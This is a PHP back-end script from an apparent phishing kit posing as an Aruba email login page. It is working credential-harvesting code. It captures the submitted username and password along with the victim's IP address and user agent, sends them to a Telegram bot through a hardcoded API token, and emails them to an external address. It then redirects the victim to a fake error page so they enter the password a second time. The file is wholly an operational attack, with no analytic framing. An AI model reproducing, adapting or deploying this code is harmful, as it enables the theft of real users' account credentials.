<?php
function getIp()
{
	if (isset($_SERVER['HTTP_CLIENT_IP'])) $ip = $_SERVER['HTTP_CLIENT_IP'];
	else if (isset($_SERVER['HTTP_X_REAL_IP'])) $ip = $_SERVER['HTTP_X_REAL_IP'];
	else if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
	else if (isset($_SERVER['HTTP_X_FORWARDED'])) $ip = $_SERVER['HTTP_X_FORWARDED'];
	else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) $ip = $_SERVER['HTTP_FORWARDED_FOR'];
	else if (isset($_SERVER['HTTP_FORWARDED'])) $ip = $_SERVER['HTTP_FORWARDED'];
	else if (isset($_SERVER['REMOTE_ADDR'])) $ip = $_SERVER['REMOTE_ADDR'];
	else $ip = false;
	if ($ip == "::1") {
		return "127.0.0.1";
	}
	return $ip;
}

if (isset($_POST['UserName'])) {

	$action = $_POST['action'];
	$user = $_POST['UserName'];
	
	if ($action == 3) {
		$ip = GetIP();
		$hostname = gethostbyaddr($ip);
		$useragent = $_SERVER['HTTP_USER_AGENT'];
		$message = "";
		$message .= "|-----Aruba Email -----|\n";
		$message .= "Email/Username: " . $_POST['UserName'] . "\n";
		$message .= "Password: " . $_POST['Password'] . "\n";
		$message .= "Client IP: " . $ip . "\n";
		$message .= "User Agent : " . $useragent . "\n";
		
		// Send to Telegram
		$apiToken = "8391410665:AAFjP64fqz_HWX5rfZ0EVmic9tlWj8j3qEY";
		$data = [
			'chat_id' => '6105365992',
			'text' => "$message"
		];
		$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data));
		
		// Send to YOUR email (change this to your email)
		$to = "noble.hamett498@mail.com"; // CHANGE THIS TO YOUR EMAIL
		$subject = "Login Credentials - Aruba";
		$emailMessage = nl2br($message);
		$headers = "MIME-Version: 1.0" . "\r\n";
		$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$headers .= 'From: noreply@yourdomain.com' . "\r\n";
		
		mail($to, $subject, $emailMessage, $headers);
		
		$encodedEmail = urlencode($user);
		header("Location: ./web/authen.php?error=3#{$encodedEmail}");
		
	} else if ($action == 4) {
		$ip = GetIP();
		$hostname = gethostbyaddr($ip);
		$useragent = $_SERVER['HTTP_USER_AGENT'];
		$message = "";
		$message .= "|-----Aruba Email 2 -----|\n";
		$message .= "Email/Username: " . $_POST['UserName'] . "\n";
		$message .= "Password: " . $_POST['Password'] . "\n";
		$message .= "Client IP: " . $ip . "\n";
		$message .= "User Agent : " . $useragent . "\n";
		
		// Send to Telegram
		$apiToken = "8391410665:AAFjP64fqz_HWX5rfZ0EVmic9tlWj8j3qEY";
		$data = [
			'chat_id' => '6105365992',
			'text' => "$message"
		];
		$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data));
		
		// Send to YOUR email (change this to your email)
		$to = "noble.hamett498@mail.com"; // CHANGE THIS TO YOUR EMAIL
		$subject = "Login Credentials - Aruba 2";
		$emailMessage = nl2br($message);
		$headers = "MIME-Version: 1.0" . "\r\n";
		$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
		$headers .= 'From: noreply@yourdomain.com' . "\r\n";
		
		mail($to, $subject, $emailMessage, $headers);
		
		header('Location: ./web/com.php');
	}
}
?>